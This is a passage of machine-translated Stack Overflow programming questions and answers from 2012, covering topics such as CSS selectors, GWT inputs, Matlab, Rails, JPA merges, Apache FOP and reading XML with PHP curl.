我在一个项目中有类似的设置。我认为解决这个问题的一种简单且或多或少的好方法是改变

```
private Collection<ClubLocation> locations; 
```

进入

```
private Collection<ClubItem> items; 
```

（以及相关的 getter、setter）。这样它肯定有效。

如果您出于方便的原因需要在 Club 中使用 getLocations 方法，您可以自由创建它。如果您确定这些项目将仅包含位置，则可以按原样返回集合，否则您需要在 Java 代码中对其进行过滤。

一个缺点是，如果项目还包含非位置元素，Java 中的过滤会占用内存和 CPU，因此可能会很慢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T06:39:36.160

对于 JPA，您的映射是完全有效的。也例如在 EclipseLink 中，它按原样工作。这是 Hibernate 实现中的问题。

[这篇博](http://chriswongdevblog.blogspot.de/2009/10/polymorphic-one-to-many-relationships.html)文提供了一种解决方法。不幸的是，所有这些都不完美：表结构的变化，丢失类型以使用映射的超类进行查询等。

# css - 将 [attribute=value] 与 :nth-child() 结合

> ID：11553619
> 
> 赞同：4
> 
> 时间：2012-07-19T03:43:58.560
> 
> 标签：css, less, css-selectors

我正在使用 LESS 并且想要匹配类型为文本的特殊输入。

目前，我正在这样做：

```
td {
    input[type=text] {
        width: 100px;
    }
} 
```

对于类型复选框的第二个输入，我需要另一个宽度。我试过这个：

```
td {
    input[type=text] {
        width: 100px;

        &:nth-child(2) {
             width: 40px;
        }
    }
} 
```

但这行不通。任何想法如何`[type=text]`结合`:nth-child()`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-19T07:15:55.067

您的 LESS 应转换为以下 CSS，没有任何错误：

```
td input[type=text] {
    width: 100px;
}

td input[type=text]:nth-child(2) {
    width: 40px;
} 
```

但是，如果您有其他元素作为文本输入的兄弟元素，则这些元素可能会干扰`:nth-child()`声明，因为[`:nth-child()`](http://www.w3.org/TR/selectors/#nth-child-pseudo)仅查看元素相对于同一父元素中所有其他兄弟元素的位置，而不仅仅是同类其他元素（即`input[type=text]`）。例如，如果您将 a`label`作为第二个孩子，那么您的输入将不再是第二个孩子，因为该位置已被标签占用。

如果您拥有的唯一输入`td`是所有人，`[type=text]`那么您应该能够摆脱使用[`:nth-of-type()`](http://www.w3.org/TR/selectors/#nth-of-type-pseudo)：

```
// LESS

td {
    input[type=text] {
        width: 100px;

        &:nth-of-type(2) {
             width: 40px;
        }
    }
} 
```

```
/* CSS */

td input[type=text] {
    width: 100px;
}

td input[type=text]:nth-of-type(2) {
    width: 40px;
} 
```

但请记住，它只查看元素名称`input`而不是`[type=text]`属性！

或者，如果您知道只有两个文本输入，您可以使用通用兄弟选择器来获取第一个*输入*之后的那个：

```
// LESS

td {
    input[type=text] {
        width: 100px;

        & ~ input[type=text] {
             width: 40px;
        }
    }
} 
```

```
/* CSS */

td input[type=text] {
    width: 100px;
}

td input[type=text] ~ input[type=text] {
    width: 40px;
} 
```

# html - GWT HTML 5 输入类型电话

> ID：11553620
> 
> 赞同：2
> 
> 时间：2012-07-19T03:44:02.173
> 
> 标签：html, gwt

我有一个 GWT 应用程序，它的目标是在移动设备上运行。我想使用新的 HTML5`input type="tel"`来接受电话输入并让移动设备提示输入正确的键盘输入（数字）。

我正在尝试使用 GWT 文本框，但看不到让它以正确的输入类型呈现 HTML 的方法。

关于这个有什么想法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T07:08:30.883

简单的方法

```
TextBox tel=new TextBox();
tel.getElement().setAttribute("type", "tel");

TextBox email=new TextBox();
email.getElement().setAttribute("type", "email");

TextBox url=new TextBox();
url.getElement().setAttribute("type", "url"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-17T13:20:30.553

创建自定义小部件：

```
package com.example;

import com.google.gwt.dom.client.InputElement;
import com.google.gwt.user.client.ui.TextBoxBase;

public class TelephoneBox extends TextBoxBase {

    public TelephoneBox() {
        super(createTelInput());
    }

    private static native InputElement createTelInput() /*-{
        var input = document.createElement("input");
        input.setAttribute("type", "tel");
        return input;
    }-*/;
} 
```

然后就可以在 UiBinder 中使用了：

```
<ui:UiBinder ... xmlns:my="urn:import:com.example">
...
<my:TelephoneBox/> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T06:09:33.517

[mgwt ( http://www.m-gwt.com](http://www.m-gwt.com) )中有很多不同的输入（也是电话输入），它是移动设备的 GWT。你可能想看看它。

# function - Matlab 的 nanmean() 函数不适用于 1 以外的维度

> ID：11553625
> 
> 赞同：3
> 
> 时间：2012-07-19T03:44:49.497
> 
> 标签：function, matlab

从[mathworks 的帮助](http://www.mathworks.com/help/toolbox/stats/nanmean.html)中举这个例子`nanmean()`：

```
 X = magic(3);
X([1 6:9]) = repmat(NaN,1,5)

X =

   NaN     1   NaN
     3     5   NaN
     4   NaN   NaN

>> y = nanmean(X,2)
??? Error using ==> nanmean
Too many input arguments. 
```

为什么即使文档说平均值可以在as的任何维度`dim`上取值，它也会显示错误？谢谢。`X``y = nanmean(X,dim)`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:56:10.477

原因如下：

如果 X 包含沿某个维度的所有 NaN 值的向量，则移除 NaN 值后该向量为空，因此剩余元素的总和为 0。由于均值涉及除以 0，因此其值为 NaN。输出 NaN 不是 NaN 值的平均值。

看： http: [//www.mathworks.com/help/toolbox/stats/nanmean.html](http://www.mathworks.com/help/toolbox/stats/nanmean.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T04:10:49.010

我完全运行您拥有的代码，我没有收到任何错误。特别是这里是我跑的：

```
>> X = magic(3);
X([1 6:9]) = repmat(NaN,1,5)

X =

   NaN     1   NaN
     3     5   NaN
     4   NaN   NaN

>> y = nanmean(X,2)

y =

     1
     4
     4

>> which nanmean
C:\Program Files\MATLAB\R2010b\toolbox\stats\stats\nanmean.m 
```

我唯一能想到的就是你`nanmean.m`的路径上有不同的版本。尝试 a`which nanmean`并查看它是否指向统计工具箱。

# facebook - 来自facebook画布应用程序的top.window.location？

> ID：11553629
> 
> 赞同：1
> 
> 时间：2012-07-19T03:45:11.160
> 
> 标签：facebook, hyperlink, facebook-apps, facebook-canvas

在某些情况下，我想要一个链接来打破 facebook 画布的 iframe。例如，如果我要链接到苹果应用商店，链接 target="_top" 或 top.window.location 似乎更谨慎。

是否存在违反 fb 政策的链接到顶部窗口的任何情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T05:28:52.353

如果您要设置 cookie 等，我认为您必须这样做。当用户第一次访问时，我捕获了 signed_request，并通过 window.parent.location 将它们发送到不同的 URL。

然后，一旦他们在我的域上进行了身份验证（我可以在其中轻松设置第一方 cookie），我将它们发送回画布应用程序的特定页面。

如果有更好的方法我很想听。

# ruby-on-rails - 默认 rspec 请求存根响应不起作用

> ID：11553635
> 
> 赞同：0
> 
> 时间：2012-07-19T03:45:48.310
> 
> 标签：ruby-on-rails, rspec

我创建了一个测试

```
rails g integration_test index --webrat 
```

这将创建文件：

```
require 'spec_helper'

describe "Indices" do
  describe "GET /indices" do
    it "works! (now write some real specs)" do
      visit indices_path
      response.status.should be(200)
    end
  end
end 
```

这一切都很好，但唯一的问题是即使`indices_path`存在这个测试也会失败：

```
Failure/Error: response.status.should be(200)
NoMethodError:
  undefined method `status' for nil:NilClass 
```

所以看起来`response`是`nil`。

我仍然可以使用`page`（例如`page.should have_content`完美运行），但不能`response`。我真的很想知道响应状态是 200。我可以使用其他的东西`response`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T05:35:31.590

如果`page`可用，看起来您可能拥有`capybara`而不是`webrat`. 你可以试试这个：

```
page.status_code.should be 200 
```

# c - 2D游戏中生成敌人的C算法

> ID：11553641
> 
> 赞同：0
> 
> 时间：2012-07-19T03:46:40.370
> 
> 标签：c, game-boy-advance

我正在用 C 编写 GameBoy Advance 游戏，我正在尝试想出最有效的生成敌人的方法。该游戏将类似于 SpyHunter ( [http://en.wikipedia.org/wiki/Spy_Hunter](http://en.wikipedia.org/wiki/Spy_Hunter) )。

问题是我不知道什么是让随机出现的敌人出现在屏幕顶部的最有效方法，并且屏幕上同时出现的敌人不会超过 3 或 4 个。

我想过在屏幕顶部的随机位置创建 4 个结构，一旦一个到达底部，就在顶部再次初始化它，以此类推，使用随机位置，但我不知道这是否是最有效的算法。

我应该如何产生敌人？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:51:02.070

您概述的算法似乎确实非常有效。

您只是为您希望在屏幕上显示的实际精灵分配内存。无论如何，您都需要跟踪它们在屏幕上的位置以正确渲染它们。一旦它们离开屏幕，您就可以重新使用现有结构。没有比这更好的了。

一种想法是在精灵离开屏幕后随机延迟一段时间，然后在屏幕顶部的随机位置重新初始化它。这将导致一些可变性。

# playframework-2.0 - playframework 2、getServletContext

> ID：11553653
> 
> 赞同：1
> 
> 时间：2012-07-19T03:49:02.337
> 
> 标签：playframework-2.0

我正在尝试使用[https://github.com/dlecan/play2-war-plugin](https://github.com/dlecan/play2-war-plugin)上的插件在 TomCat 中运行我的播放应用程序 我遇到的一个问题是将文件上传到服务器。我想知道是否有办法获取 servletContext 然后我可以调用

**context.getResource()**来获取我的应用程序的根路径。正如[我在另一个问题中提到的](https://stackoverflow.com/questions/11112730/play2-war-plugin-change-application-path)

使用**Play.application().path(** ) 不会给出正确的路径。

有什么办法可以做到这一点？

感谢您的输入。

# html - HTML在屏幕上显示之前是否需要转换为机器码

> ID：11553654
> 
> 赞同：0
> 
> 时间：2012-07-19T03:49:06.523
> 
> 标签：html

在客户端浏览器从apache服务器获得html响应后，这个html代码是否需要解释（也许编译，如果我可以使用“编译”而不是“解释”这个词，我不需要）到机器代码以便进一步显示或浏览器只需要直接在屏幕上显示这些 html 代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:51:30.413

他们通常称之为`rendering`。

请参阅 WIKI[帖子](http://en.wikipedia.org/wiki/Web_browser_engine)。

> Web 浏览器引擎（有时称为布局引擎或渲染引擎）是一种软件组件，它接收标记的内容（例如 HTML、XML、图像文件等）和格式信息（例如 CSS、XSL 等）。并在屏幕上显示格式化的内容。它在显示在监视器或打印机上的窗口的内容区域上“绘制”。

# android - 加载列表视图中的动画

> ID：11553661
> 
> 赞同：0
> 
> 时间：2012-07-19T03:49:57.770
> 
> 标签：android, android-animation

我做了一个列表视图，当我滚动列表视图时，加载圈在页脚处工作，然后再获取下一个列表项。加载圈设置并从listview获取

```
public void setLoadingView(View listFooter) {
    this.listFooter = listFooter;
}

public View getLoadingView() {
    return listFooter;
} 
```

这是圆圈的 xml

```
<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_marginLeft="10dip"
    android:layout_marginRight="10dip"
    android:layout_marginTop="5dip"
    android:layout_marginBottom="5dip"

    android:baselineAligned="true"
    android:gravity="center"
    android:orientation="horizontal" >

     <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
      android:background="@drawable/pencil"
        android:textColor="#B36000" />
 </LinearLayout> 
```

然后在listview中设置这个布局。现在我要做的是我需要在加载圈中更换一支笔，其中笔是动画的。它的动画就像笔在写字一样。（就像有人在 Skype 上写字时，在屏幕上显示笔字）。我有这个钢笔动画的 4 张图片。实际上我不明白该怎么做:(...我是 android 新手

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:02:47.217

查看[帧动画](http://developer.android.com/guide/topics/resources/animation-resource.html#Frame)。似乎，您只需要创建动画资源并将其作为 ImageView 的背景。查看[此问题](https://stackoverflow.com/questions/2785336/starting-frame-by-frame-animation)以获取有关如何启动动画的一些代码片段和详细信息。

# javascript - InnerHTML 在 IE 中不起作用

> ID：11553666
> 
> 赞同：0
> 
> 时间：2012-07-19T03:50:42.593
> 
> 标签：javascript, html, innerhtml

当观众在澳大利亚或新西兰时，我正在使用 Javascript 使用 innerHTML 将视频嵌入到网页中。我的脚本可以在所有浏览器中运行，但由于某种原因，它不能在任何版本的 IE 中运行。

这是我使用的 Javascript 代码：

```
<script type="text/javascript"> 
    var countryName = geoip_country_name();
        var boxbaby = document.getElementById('tvc'); 
    var video = "<embed type='application/x-shockwave-flash' src='../htm/summer-tvc/player.swf' id='summertvc' width='452' height='255' flashvars='skin=../htm/summer-tvc/skins/mySkin.swf&thumbnail=../htm/summer-tvc/thumbnail.jpg&video=http://f4player.googlecode.com/files/inhibited-island.mp4' allowscriptaccess='always' allowfullscreen='true' bgcolor='#000000' />";

    if (countryName == "Australia" || countryName == "New Zealand") { 
        document.getElementById('tvcontent').innerHTML = video;
    } else {
        document.getElementById('tvcontent').innerHTML = "<img src='../images/pages/summer-tvc/tvc-outside-area.jpg' alt='Due to legal restrictions you are unable to view this video as your IP address is registered outside of Australia and New Zealand. We apologise for the inconvenience.'/>";
    }; 

</script> 
```

这是HTML

```
 <div id="tvc"> 
  <div id="tvcontent"></div>  
   </div> 
```

任何人都知道为什么它在 IE 中不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:05:10.990

您可能必须使用`<object>`标签。

请参阅[此处](https://stackoverflow.com/questions/7655585/html-flash-object-embed-not-working-in-ie)以供参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:05:13.970

这可能是一个文档类型问题。尝试在网页上定义一个文档类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:08:57.100

> 该`<EMBED>`标记还可用于将 SWF 文件添加到网页，但它是较旧的标记，现已过时。

IE 需要[对象标签](http://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html)而不是嵌入标签。

# ruby-on-rails - 控制器未创建关联

> ID：11553667
> 
> 赞同：0
> 
> 时间：2012-07-19T03:50:59.403
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, nested-attributes

我有两个模型，用户和组织，它们使用分配表具有 has_many 关系。创建用户时我有一个嵌套的资源表单，它可以很好地创建一个关联的组织。但是，在创建组织时，它不会将其与用户相关联。

这是我的相关组织控制器代码：

```
 def new
    @organization = current_user.organizations.build
  end

  def create
    @organization = current_user.organizations.build(params[:organization])
    @organization.save
  end 
```

还有我的模型：

组织分配

```
class OrganizationAssignment < ActiveRecord::Base
  belongs_to :user
  belongs_to :organization

  attr_accessible :user_id, :organization_id
end 
```

组织：

```
class Organization < ActiveRecord::Base
  validates :subdomain, :presence => true, :uniqueness => true

  has_many :organization_assignments
  has_many :people
  has_many :users, :through => :organization_assignments

  attr_accessible :name, :subdomain
end 
```

用户：

```
class User < ActiveRecord::Base

  has_many :organization_assignments
  has_many :organizations, :through => :organization_assignments

  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  accepts_nested_attributes_for :organizations

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me, :organizations_attributes
  # attr_accessible :title, :body

end 
```

表单视图：

```
= form_for @organization, :html => { :class => 'form-horizontal' } do |f|
  - @organization.errors.full_messages.each do |msg|
    .alert.alert-error
      %h3
        = pluralize(@organization.errors.count, 'error')
        prohibited this user from being saved:
      %ul
        %li
          = msg

  = f.label :name
  = f.text_field :name

  = f.label :subdomain
  = f.text_field :subdomain

  .form-actions
    = f.submit nil, :class => 'btn btn-primary'
    = link_to t('.cancel', :default => t("helpers.links.cancel")), organizations_path, :class => 'btn' 
```

事后我可以在控制台中很好地关联组织，所以我很确定模型中的关系设置正确。还有什么我想念的吗？

# php - 为每个选中的复选框显示相同的问题集。（PHP 和 JS/Jquery）

> ID：11553669
> 
> 赞同：0
> 
> 时间：2012-07-19T03:51:05.320
> 
> 标签：php, javascript, jquery

我有一组复选框，当它们被选中时，我必须显示问题。这些问题永远都是一样的。这是在 PHP 中完成的

例子

复选框 1 复选框 1 复选框 1 复选框 1

如果复选框 1 和 3 被选中并且应该显示

复选框 1：从日期和日期到开始时间和结束时间
复选框 3：从日期和日期到开始时间和结束时间

如果复选框 4 被选中，则复选框 4 的另一个框应该出现相同的问题并且应该显示。

复选框 1：开始日期、结束日期、开始时间和结束时间
复选框 3：开始日期、结束日期、开始时间和结束时间
复选框 4：开始日期、结束日期、开始时间和结束时间

如果未选中复选框 3，则应取消复选框 3 的问题，并且应仅显示复选框 1 和 4 的问题
复选框 1：日期和日期以及开始时间和结束时间
复选框 4：日期和日期以及开始时间和结束时间

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T08:13:56.497

你可以做这样的事情，它可能会帮助你......

**HTML**

```
<div id="panel">
  <input type="button" id="btnadd" name="btnadd" value="Add Question"/>
  <input type="button" id="btnreset" name="btnreset" value="Reset"/>
  <div id="quecheckbox">
  </div>
  <div id="quelist">
  </div>
</div> 
```

**jQuery：**

```
function show_ques() {
        var i = $(this).attr('id').substr(-1);
        if ($(this).is(":checked")) {
            //get total count of question list 
            var nQue = $("#quelist").find("div[class^=que]").length;
            var isSet = false; //boolean to check if que is appended or not. 
            if (nQue > 0) {
                var nq = 0;
                $("#quelist").find("div[class^=que]:last").attr('class').substr(-1);
                $("#quelist").find("div[class^=que]").each(function() {
                    nq = $(this).attr('class').substr(-1);

                    if (nq > i && !isSet) {
                        $("#quelist .que" + nq).before("<div class='que" + i + "'>Question " + i + " is....?</div>");
                        isSet = true;
                    }
                });
            }
            if (!isSet) {
                $("#quelist").append("<div class='que" + i + "'>Question " + i + " is....?</div>");
            }
        } else {
            $("#quelist").find("div.que" + i).remove();
        }
 }
$(function() {
        $("#btnadd").click(function() {
            var i = $("#quecheckbox").find("input[type=checkbox]").length;
            if (i <= 0) i = 1;
            else i += 1;
            $("#quecheckbox").append("<div><input type='checkbox' id='que" + i + "' name='que" + i + "'/><label for='que" + i + "'>Question " + i + "</div>");

            $("#que" + i).bind('change', show_ques);

        });
        $("#btnreset").click(function() {
            $("#quecheckbox").html("");
            $("#quelist").html("");
        });
 }); 
```

我已经在[http://codebins.com/bin/4ldqpa8上为上述问题完成了 bin](http://codebins.com/bin/4ldqpa8)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:06:04.723

这是一种方法。为了将来参考，您可能应该自己尝试一些东西，然后询问为什么它可能不起作用。

[http://jsfiddle.net/nickcaballero/U7JGW/](http://jsfiddle.net/nickcaballero/U7JGW/)

# xsl-fo - 如何在 Apache FOP 中指定行长行为？

> ID：11553675
> 
> 赞同：0
> 
> 时间：2012-07-19T03:51:58.247
> 
> 标签：xsl-fo, apache-fop, ecrion

![Ecrion 和 Apache FOP 的输出](../Images/94dfd4391625cb5ae4e368c6d567f84c.png)

我在 Ecrion 和 Apache FOP 的试验中渲染了相同的 XSL-FO，您会注意到这两个渲染器在第 2 行和第 3 行产生了不同的行长。Ecrion 渲染文本的方式就是我想要的方式就像 Apache FOP 一样。

是否有我可以添加到`<fo:block>`包含文本的属性，该属性会导致 FOP 以与 Ecrion 相同的行长呈现文本？是否有一个命令行开关可以传递给 FOP 以获得这种行为？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T23:36:22.423

查看源代码，目前只有一个换行算法的实现。

在 LineLayoutManager.java 中有一个名为“findOptimalBreakingPoints”的私有方法。在第 834 行附近，我注释掉了增加“maxAdjustment”的行，并且不再发生行的“平衡”。

我知道这是一个 hacky 解决方案，但我没有时间进一步调查并编写自己的换行算法。

# linux - 页面分配失败中的顺序和模式

> ID：11553676
> 
> 赞同：2
> 
> 时间：2012-07-19T03:52:09.720
> 
> 标签：linux, kernel

谁能帮助我理解页面分配失败的内核错误中的“顺序”和“模式”参数表示什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:41:50.013

模式是与分配请求一起传递的[gfp_flags](http://kernel.org/doc/gorman/html/understand/understand009.html)，并指定内存分配器的请求行为（GFP_KERNEL、GFP_ATOMIC、...）。order 是从分配器请求的页面数的日志，例如，对于 2 个页面请求， order 为 1，当请求 16 个页面时， order 为 4。

如果您想尝试进行映射，另请参阅[2 。](http://lxr.free-electrons.com/source/include/linux/gfp.h)

# ejb - 无法合并已移除的实体

> ID：11553677
> 
> 赞同：2
> 
> 时间：2012-07-19T03:52:40.070
> 
> 标签：ejb, ejb-3.0, ejb-3.1

我在开发工作中遇到了一些非常令人费解的事情。

```
removePreviousFoodMenuItems(oldRefList);
shFood.setNewFoodMenuItems(newRefList);
em.merge(shFood);
em.flush(); //Error occurs 
```

如果我在合并之前调用 removePreviousFoodMenuItems，我将在运行时收到“无法合并已被删除的实体”异常。但是，这不应该发生，因为我已将 shFood 设置为引用一组新的食物菜单项 (newRefList)。那么为什么merge 还在尝试合并已经被移除的oldRefList 元素呢？如果我将 removePreviousFoodMenuItems 放在 flush 语句之后，则不会出现此问题。

```
shFood.setNewFoodMenuItems(newRefList);
em.merge(shFood);
em.flush(); //Error does not occur
removePreviousFoodMenuItems(oldRefList); 
```

下面是 removePreviousFoodMenuItems 的代码

```
public void removePreviousFoodMenuItems(ArrayList<FoodMenuItem> oldRefList){

        for (Object f : oldRefList) {

            FoodMenuItem foodMenuItem = (FoodMenuItem) f;
            foodMenuItem.setStakeholderFood(null);
            foodMenuItem.setPhotoEntity(null);

            em.remove(foodMenuItem);
            //em.flush();
        }//end for

    }//end removePreviousFoodMenuItems 
```

非常感谢对此的一些建议！

更新：如何创建 newRefList：

```
StakeholderFood stakeholder = em.find(StakeholderFood.class, stakeholderID);
ArrayList<FoodMenuItem> newRefList = new ArrayList<FoodMenuItem>();

for (Object o : menuItem) {
            FoodMenuItem fmi = (FoodMenuItem) o;
            FoodMenuItem newFmi = new FoodMenuItem();
            String previousName = fmi.getItemName();

            newFmi.setItemName(previousName);
            newFmi.setItemPrice(fmi.getItemPrice());
            newFmi.setPhotoEntity(fmi.getPhotoEntity());

            //Upload the photos for each item attached to menuItem
            Photo photo = fmi.getPhotoEntity();

            if(photo!=null){
                photo.setFoodmenuItem(newFmi); //set new relationship, break off with old
                em.merge(photo); //This will merge newFmi as well Fix this tomorrow
                em.flush(); //update the links immediately
            }

            if (photo != null && fmi.getContainsImage() == Boolean.FALSE) {
                uploadFoodMenuItemImages(photo);                    
                newFmi.setPhotoEntity(photo);
                newFmi.setContainsImage(Boolean.TRUE);
                newFmi.setRenderedImage(Boolean.FALSE);
                newFmi.setRenderedImageAltText(Boolean.FALSE);
            }//end photo
            else {
                newFmi.setRenderedImageAltText(Boolean.TRUE);
            }

            newFmi.setStakeholderFood(stakeholder);
            newRefList.add(newFmi);

        }//end for 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:17:10.813

`FoodMenuItem`您在`oldRefList`和中都有一个或多个相同的实例`newRefList`。将删除应用于所有项目，`oldRefList`然后会导致其中的一些实体`newRefList`被删除。

结果是`shFood`保存这样一个列表，其中至少有一个`FoodMenuItem`被删除。如果在删除之前执行flush，那么在flush发生的那一刻，就没有这样的问题，因为`shFood`没有引用被删除的实例。

# php - 使用 curl 和 php 从 url 读取 xml 数据

> ID：11553678
> 
> 赞同：3
> 
> 时间：2012-07-19T03:52:48.557
> 
> 标签：php, xml, json, curl

我想从 URL 读取 XML 数据。我的网址如下：

[http://www.arrowcast.net/fids/mco/fids.asp?sort=city&city=&number=&airline=&adi=A](http://www.arrowcast.net/fids/mco/fids.asp?sort=city&city=&number=&airline=&adi=A)

这是我的代码：

```
$Url="http://www.arrowcast.net/fids/mco/fids.asp?sort=city&city=&number=&airline=&adi=A";  
if (!function_exists('curl_init')){
    die('Sorry cURL is not installed!');
} 
   $ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $Url);   
$output = curl_exec($ch);
$resultCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
// Close the cURL resource, and free system resources
curl_close($ch); 
```

谁能告诉我如何读取 xml 数据？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-19T04:13:25.997

以下是一些示例代码（您的 PHP 安装中可能没有 XML 解析模块）：

```
<?php

$url="http://www.arrowcast.net/fids/mco/fids.asp?sort=city&city=&number=&airline=&adi=A";
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $url);    // get the url contents

$data = curl_exec($ch); // execute curl request
curl_close($ch);

$xml = simplexml_load_string($data);
print_r($xml);

?> 
```

变量`$xml`现在是一个多维键值数组，您应该很容易弄清楚如何从那里获取元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T07:20:07.990

```
// the SAX way:
XMLReader myReader = XMLReaderFactory.createXMLReader();
myReader.setContentHandler(handler);
myReader.parse(new InputSource(new URL(url).openStream()));

// or if you prefer DOM:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new URL(url).openStream()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-23T10:44:02.087

这是如何从 youtube 的 rss 提要中获取频道 ID 的演示，其中我使用 curl 从 url 读取 xml 数据。

```
$channel_id = 'XXXXXXXX'; // put the channel id here

//using curl
$url = 'https://www.youtube.com/feeds/videos.xml?channel_id='.$channel_id.'&orderby=published';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$response  = curl_exec($ch);
curl_close($ch);

$response=simplexml_load_string($response);
$json = json_encode($response);
$youtube= json_decode($json, true);

$count = 0;
if(isset($youtube['entry']['0']) && $youtube['entry']['0']!=array())
{
    foreach ($youtube['entry'] as $k => $v) {
        $yt_vids[$count]['id'] = str_replace('http://www.youtube.com/watch?v=', '', $v['link']['@attributes']['href']);
        $yt_vids[$count]['title'] = $v['title'];
        $count++;
    }
}
else
{
    $yt_vids[$count]['id']=str_replace('http://www.youtube.com/watch?v=', '', $youtube['entry']['link']['@attributes']['href']);
    $yt_vids[$count]['title']=$youtube['title'];
}
echo "<pre>";
print_r($yt_vids); 
```

# javascript - 使用javascript获取div的属性

> ID：11553679
> 
> 赞同：0
> 
> 时间：2012-07-19T03:52:49.573
> 
> 标签：javascript, html, getelementsbytagname

我想从这些 div 的元素“src”中获取这些值“xxxxx”

我尝试了很多getelements，但没有奏效。

任何人都可以帮助我吗

```
<div id="iframe_container" >
    <iframe name="I1" marginwidth="1" marginheight="1" width="100%" height="100%" frameborder="0" scrolling="auto" align="center" src="xxxxx"  class="floating_iframe"> 
        Your browser does not support inline frames or is currently configured not to display inline frames.
    </iframe>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:55:34.607

如果您要做的是获取`src`iframe 的，您可以使用以下代码：

```
var iframes = document.getElementById("iframe_container").getElementsByTagName("iframe");
var src = iframes[0].src; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:29:05.607

你需要：

1.  获取元素 - 在本例中为 iframe（您可以使用`document.getElementById`，`document.getElementsByName`或任何其他方式 - 取决于您是否使用任何框架以及您拥有什么标记）
2.  一旦你有了元素，你就可以简单地调用`getAttribute("src")`那个元素。

示例（[http://jsfiddle.net/K3pEw/12/](http://jsfiddle.net/K3pEw/12/)）：

```
var iFrame = document.getElementsByName('I1');
alert("The src attribute of your iframe is: "  + iFrame[0].getAttribute('src')) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:18:19.710

如果您可以访问[jQuery](http://jquery.com)，则可以编写：

```
var src = $('#iframe_container iframe').attr('src'); 
```

# java - 将 JSON 数据从 Javascript 发布到 Java

> ID：11553680
> 
> 赞同：0
> 
> 时间：2012-07-19T03:53:08.087
> 
> 标签：java, javascript, json, jetty, apache-camel

我需要一些绝望的帮助。我已经在这里待了4个小时，而且我已经筋疲力尽了。：/这是我的情况：

我有一个 Javascript 应用程序正在向外部站点发出 POST 请求（使用 jQuery $.post）。在外部站点上，我让 Apache Camel 与 Jetty 一起运行以将其公开给网络。我用 Camel 编写的 Web 服务需要所有请求的 JSON 数据。例如，一个请求需要一个 id，所以我发送它`{"id": 10}`。

这是我的问题：它不适用于 Javascript。我有一些不同的工具可以为我发送帖子请求（比如浏览器的海报扩展）。如果我使用 Poster 并将 body 设置为`{"id": 10}`，它工作得很好。我在服务中得到了那个确切的字符串。

但是，如果我从 Javascript 发布，我会得到不同的东西。发布 JSON 对象会给我的服务端字符串“id=10”。（这种情况没问题，但我最终需要实际的 JSON 对象。）如果我对 JSON 对象进行字符串化，我得到 JSON 字符串，只有所有字符都被转义。（例如“%7Bid%33...”）。

我发誓我已经尝试了所有可能的方法来发布数据，但我要么得到奇怪的已经解析的 JSON，要么得到转义的字符串（或者什么都没有）。有什么方法可以让 Javascript 不解析 JSON 对象并发送它（就像我的发布工具一样）？如果没有，是否有一种安全、有效的方法来取消转义我得到的 JSON 字符串？

我真的很感激任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:09:18.970

我觉得我们需要更多信息，但是看看这个 javascript 插件。这可能是您的解决方案：[https ://github.com/flowersinthesand/jquery-stringifyJSON](https://github.com/flowersinthesand/jquery-stringifyJSON)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:07:41.740

尝试使用 jQuery.ajax 并设置`processData`为`false`（默认为`true`）：

```
$.ajax({
  url: '/where/to/post',
  type: 'POST',
  data: {"id": 10},
  processData: false
}); 
```

通常，jQuery 将任何内容转换`data`为查询字符串格式，例如`id=10`. 该`processData`标志告诉 jQuery 将其逐字解释为 json hashmap。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T08:04:59.027

